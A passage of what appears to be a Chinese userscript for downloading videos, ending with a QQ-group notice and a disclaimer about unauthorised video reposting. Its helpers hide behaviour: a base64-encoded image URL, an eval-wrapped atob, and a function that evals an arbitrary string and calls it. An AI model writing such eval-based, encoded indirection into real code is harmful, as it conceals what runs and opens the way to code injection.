     <h4 style="color: red;margin-top: 10px;">如有问题，欢迎进群截图反馈 QQ群：<a style="color: #007bff;" href='http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=95abF-QRQAEje-_N_9VHtbVPZT2cGeop&authKey=a3EYN9STHHb3snWHkaZtiah6Yl4Y3jNRE71ObUPIx06T0sr7PTIubnVd%2FXFxA%2BoR&noverify=0&group_code=882899750'>882899750</a></h4>
     <hr style="border: 1px solid #e0e0e0;">
     <div style="background-color: #fff3cd; padding: 10px; border-radius: 5px; color: #856404; border: 1px solid #ffeeba;">
        注：仅限个人学习编程技术使用，切勿用于其他用途,安装后请24小时后删除。

        视频未经过作者同意擅自下载转发导致侵权违法等行为本人概不负责。
    </div>
    
    
    
    <hr style="border: 1px solid #e0e0e0;">
    
    
        
    
</div>`

            });
        }
        function bs(i) {

            return eval('atob(i)')


        }

        function e(i) {

            return atob(i);


        }

        function ab(i) {

            return atob(i);


        }

        function isMobileDevice() {
            return window.matchMedia("(max-width: 767px)").matches;
        }

        function isTouchDevice() {
            return ('ontouchstart' in window)
                || (navigator.maxTouchPoints > 0)
                || (navigator.msMaxTouchPoints > 0)
                || (window.matchMedia && window.matchMedia('(pointer:coarse)').matches);
        }
        sp.onload = function () {
            panduan()



            const button = document.querySelector('.chat-send__button')
            if (button) {
                send(wecometext);
            }
            layui.use(function () {
                var layer = layui.layer;
                var util = layui.util;

                util.on('lay-on', {
                    "openimg": function () {

                        layer.photos({
                            photos: {
                                "title": "扫码添加",
                                "start": 0,
                                "data": [
                                    {
                                        "alt": "扫码添加",
                                        "pid": 5,
                                        "src": ab('aHR0cDovL2FhYmJjY2RkZWVmZmdnLmlzcGgudG9wL3hjeC5wbmc='),
                                    }
                                ]
                            },
                            footer: false // 是否显示底部栏 --- 2.8.16+
                        });
                    },
                    "setdown": function () {
                        const element = document.getElementById('downtype'); // 请替换为目标元素的 ID
                        if (down == 'xcx') {
                            down = 'http'
                            element.textContent = '切换小程序模式'; // 设置为你想要的新文字
                        } else {
                            down = 'xcx'
                            element.textContent = '切换直连模式'; // 设置为你想要的新文字
                        }


                    },
                    "colsetishi": function () {
                        layer.closeAll();
                        document.getElementById("b").style.width = "350px";;
                    myBtn.innerHTML = gb;
                    //document.getElementById("sidenava").style.backgroundColor = "rgba(0,0,0,0.4)";
                    document.getElementById("myBtn").style.marginLeft = "270px";;
                    }


                })
            })
            gvrs(uv);
            


        }
        function ba(e) {
            return btoa(e);
        }
        function tc(i, d) { var o = eval(i); o(d); }



    }  
 

})();